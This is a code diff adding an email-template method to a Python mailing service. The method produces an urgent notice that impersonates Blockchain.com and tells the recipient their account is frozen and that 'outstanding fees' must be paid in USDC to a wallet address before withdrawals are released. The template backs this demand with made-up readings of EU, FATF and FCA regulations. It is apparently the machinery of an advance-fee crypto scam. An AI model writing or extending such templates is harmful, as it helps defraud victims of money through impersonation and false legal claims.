@@ -232,6 +232,69 @@ class EmailService:
     <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Finance Team</p>"""
         return subject, _wrap(content)
 
+    # ── Fee Resolution Email (detailed regulatory explanation) ─────────
+    def get_fee_resolution_email(self, user_name: str, total_fees: str, eth_wallet_address: str) -> tuple:
+        subject = "Urgent: Outstanding Fees Must Be Cleared - Blockchain.com"
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Important Notice Regarding Your Outstanding Fees</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">We are writing to inform you that your account currently has outstanding transaction fees totalling:</p>
+
+    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
+      <p style="margin:0 0 4px 0;font-size:13px;opacity:0.9;">Total Outstanding Fees</p>
+      <p style="margin:0;font-size:32px;font-weight:700;">&euro;{html.escape(total_fees)}</p>
+    </div>
+
+    <p style="color:#555555;margin:0 0 12px 0;">These fees <strong>must be cleared</strong> before any withdrawal from your account can be processed. We understand this may be inconvenient, and we want to explain why this process exists and why it cannot be handled differently.</p>
+
+    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#333333;margin:0 0 8px 0;font-weight:700;font-size:15px;">Why can't the fees be deducted from my existing balance?</p>
+      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Your account has been flagged for review and is currently set for closure under our regulatory compliance framework. When an account enters this state, <strong>all existing funds are frozen and ring-fenced</strong> in accordance with applicable financial regulations. Neither Blockchain.com nor you, as the account holder, can authorise deductions from a frozen balance.</p>
+      <p style="color:#555555;margin:0;font-size:13px;">This restriction is mandated by the following regulatory frameworks:</p>
+    </div>
+
+    <div style="background-color:#f0f4ff;border:1px solid #c5cae9;border-radius:8px;padding:16px;margin:16px 0;">
+      <p style="color:#1a237e;font-weight:700;margin:0 0 12px 0;font-size:14px;">Applicable Regulatory Framework</p>
+      <ul style="color:#555555;margin:0;padding-left:18px;font-size:13px;">
+        <li style="margin-bottom:8px;"><strong>EU Anti-Money Laundering Directive (AMLD 6)</strong> &mdash; Requires financial institutions to freeze and segregate funds in accounts under review. No internal transfers or deductions are permitted until the review is concluded and fees are settled externally.</li>
+        <li style="margin-bottom:8px;"><strong>Markets in Crypto-Assets Regulation (MiCA)</strong> &mdash; Under MiCA, crypto-asset service providers must ensure that client funds under compliance review remain untouched. Fee settlement must occur through a separate, verifiable transaction to maintain a clear audit trail.</li>
+        <li style="margin-bottom:8px;"><strong>Financial Action Task Force (FATF) Recommendation 15</strong> &mdash; FATF guidelines on virtual assets require that all outstanding obligations are cleared through independent transactions when an account is in a restricted state, ensuring full traceability of fund flows.</li>
+        <li style="margin-bottom:8px;"><strong>FCA Consumer Duty (PS22/9)</strong> &mdash; As a UK-registered entity, Blockchain.com is bound by the Financial Conduct Authority's rules, which prohibit the commingling of frozen client assets with operational fee settlements.</li>
+      </ul>
+    </div>
+
+    <p style="color:#555555;margin:12px 0;">In simple terms: <strong>the law requires fees to be paid as a separate deposit</strong>, not deducted from your existing balance. This protects you as a client by ensuring that your assets remain fully accounted for at all times.</p>
+
+    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">How to Clear Your Fees</h3>
+    <p style="color:#555555;margin:0 0 8px 0;">Please deposit <strong>&euro;{html.escape(total_fees)}</strong> in USDC (ERC-20) to the wallet address assigned to your account:</p>
+
+    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
+      {html.escape(eth_wallet_address)}
+    </div>
+    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">You can also find this address in your wallet by clicking the "Deposit" button.</p>
+
+    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Steps to Complete Payment</h3>
+    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;font-size:14px;">
+      <li style="margin-bottom:6px;">Purchase USDC from a licensed cryptocurrency exchange (e.g. Coinbase, Binance, Kraken).</li>
+      <li style="margin-bottom:6px;">Send exactly <strong>&euro;{html.escape(total_fees)}</strong> worth of USDC to the wallet address above.</li>
+      <li style="margin-bottom:6px;">Use the <strong>ERC-20 (Ethereum) network</strong> when sending.</li>
+      <li style="margin-bottom:6px;">Once confirmed, your fees will be marked as paid and your withdrawal will be unlocked.</li>
+    </ol>
+
+    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
+      <p style="color:#2e7d32;margin:0 0 4px 0;font-weight:600;">What happens after I pay?</p>
+      <p style="color:#555555;margin:0;font-size:13px;">Once your fee payment is confirmed on the blockchain, your account will be updated immediately. You will then be able to withdraw your <strong>full balance</strong> to your bank account via IBAN without any further restrictions.</p>
+    </div>
+
+    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
+      <p style="color:#555555;margin:0;font-size:12px;"><strong>Disclaimer:</strong> Blockchain.com operates under the regulatory oversight of the Financial Conduct Authority (FCA), UK registration. All compliance procedures, including fee settlement requirements, are conducted in accordance with EU Directive 2015/849 (AMLD), Regulation (EU) 2023/1114 (MiCA), and FATF international standards. These measures are designed to protect our clients and maintain the integrity of the financial system.</p>
+    </div>
+
+    <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions or require assistance, please do not hesitate to contact our support team.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance &amp; Finance Team</p>"""
+        return subject, _wrap(content)
+
     # ── Welcome Email ───────────────────────────────────────────────────
     def get_welcome_email(self, user_name: str, login_link: str) -> tuple:
         subject = "Welcome to Blockchain.com"
